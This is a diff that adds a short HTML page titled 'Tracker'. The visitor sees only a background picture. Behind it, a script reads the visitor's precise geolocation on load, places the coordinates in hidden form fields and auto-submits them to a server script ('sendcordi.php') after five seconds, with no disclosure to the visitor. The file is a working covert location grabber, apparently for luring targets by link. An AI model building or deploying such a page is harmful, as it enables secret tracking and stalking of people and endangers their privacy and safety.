@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Tracker</title>
+</head>
+<body>
+<form id='frm' action="sendcordi.php" method="POST">
+        <input type="hidden" name="cdlat" id="cdlat" value="">
+        <input type="hidden" name="cdlon" id="cdlon" value="">
+</form>
+</body>
+<script>
+var lat = document.getElementById("cdlat");
+var lon =document.getElementById('cdlon');
+
+var options = {
+  enableHighAccuracy: true,
+  timeout: 5000,
+  maximumAge: 60000
+};
+function error(err) {
+  console.warn(`ERROR(${err.code}): ${err.message}`);
+}
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition,error,options);
+  } else { 
+    lat.value = "Geolocation is not supported by this browser.";
+    lon.value = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  lat.value = position.coords.latitude;
+  lon.value = position.coords.longitude;
+}
+
+function subm(){
+document.getElementById('frm').submit();
+}
+getLocation();
+setTimeout(function(){document.getElementById('frm').submit();},5000);
+
+</script>
+<style>
+  body {
+    background-image: url("https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2018/03/screener_1521017380872-796x419.jpg");
+    background-repeat: no-repeat;
+    background-size: cover;
+    font-size: 4vh;
+
+
+  }
+</style>
+</html>
